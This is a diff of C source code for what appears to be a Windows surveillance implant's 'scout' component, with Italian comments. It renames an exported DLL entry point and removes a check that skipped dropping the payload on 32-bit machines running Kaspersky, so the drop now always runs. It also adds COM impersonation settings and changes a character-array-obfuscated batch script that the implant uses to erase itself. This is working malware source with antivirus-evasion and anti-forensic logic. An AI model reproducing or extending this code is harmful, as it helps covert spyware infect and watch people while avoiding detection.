@@ -37,7 +37,7 @@ HANDLE hScoutSharedMemory;
 //PWCHAR urs73A(PULONG pSynchro) // questa viene richiamata dai meltati
 //__declspec(dllexport) PWCHAR jfk31d1QQ(PULONG pSynchro)
 //__declspec(dllexport) PWCHAR reuio841001a(PULONG pSynchro) // questa viene richiamata dai meltati
-__declspec(dllexport) PWCHAR sfjRRg43(PULONG pSynchro) // questa viene richiamata dai meltati
+__declspec(dllexport) PWCHAR iowojdksjd(PULONG pSynchro) // questa viene richiamata dai meltati
 {
 #ifdef _DEBUG
 	OutputDebugString(L"[+] Setting uMelted to TRUE\n");
@@ -71,8 +71,7 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 		MessageBox(NULL, L"Running in background", L"Engine started", 0);
 		return 0;
 	}
-	
-	
+		
 	memcpy(pServerKey, CLIENT_KEY, 32);
 	memcpy(pConfKey, ENCRYPTION_KEY_CONF, 32);
 	memcpy(pLogKey, ENCRYPTION_KEY, 32);
@@ -130,11 +129,14 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 
 	MySleep(WAIT_DROP);	
 
-	// do not drop if kaspersky x86
-	BOOL bIsWow64, bIsOS64, bDrop;
-	IsX64System(&bIsWow64, &bIsOS64);
+	CoInitializeEx(0, COINIT_MULTITHREADED);
+	CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE,NULL);
 
-	bDrop = TRUE;
+	// do not drop if kaspersky x86
+	//BOOL bIsWow64, bIsOS64, bDrop;
+	//IsX64System(&bIsWow64, &bIsOS64);
+
+	//bDrop = TRUE;
 //	if (!bIsOS64)
 //	{
 //		WCHAR pKasp[] = { L's', L'p', L'e', L'r', L's', L'k', L'y', 0x0 };
@@ -146,7 +148,7 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 //		free(pApplicationList);
 //	}
 
-	if (!uMelted && bDrop)
+	if (!uMelted)
 		Drop();
 
 	UseLess();
@@ -198,7 +200,7 @@ VOID DoCopyFile(PWCHAR pSource, PWCHAR pDest)
 	
 	CreateCopyBatch(pSource, pDest, &pBatchName);
 	StartBatch(pBatchName);
-	MySleep(2000);
+	MySleep(8000);
 	DeleteFile(pBatchName);
 	
 	free(pBatchName);
@@ -262,7 +264,8 @@ VOID WaitForInput()
 VOID DeleteAndDie(BOOL bDie)
 {
 	HANDLE hFile;
-	char batch_format[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', ':', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '"', '%', 'S', '"', '\r', '\n', 'i', 'f', ' ', 'e', 'x', 'i', 's', 't', ' ', '"', '%', 'S', '"', ' ', 'g', 'o', 't', 'o', ' ', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '/', 'F', ' ', '"', '%', 'S', '"', 0x0 };
+	//char batch_format[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', ':', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '"', '%', 'S', '"', '\r', '\n', 'i', 'f', ' ', 'e', 'x', 'i', 's', 't', ' ', '"', '%', 'S', '"', ' ', 'g', 'o', 't', 'o', ' ', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '/', 'F', ' ', '"', '%', 'S', '"', 0x0 };
+	char batch_format[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', ':', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '"', '%', 'S', '"', '\r', '\n', 'i', 'f', ' ', 'e', 'x', 'i', 's', 't', ' ', '"', '%', 'S', '"', ' ', 'g', 'o', 't', 'o', ' ', 'd', '\r', '\n', 'e', 'c', 'h', 'o', ' ', ';', '>', '"', '%', 'S', '"', 0x0 };
 
 	if (hScoutSharedMemory)
 	{
@@ -358,7 +361,7 @@ VOID DeleteAndDie(BOOL bDie)
 
 PCHAR GetScoutSharedMemoryName()
 {
-	PCHAR pName = (PCHAR)malloc(16);
+	PCHAR pName = (PCHAR) malloc(16);
 	memset(pName, 0x0, 16);
 
 	_snprintf_s(pName, 
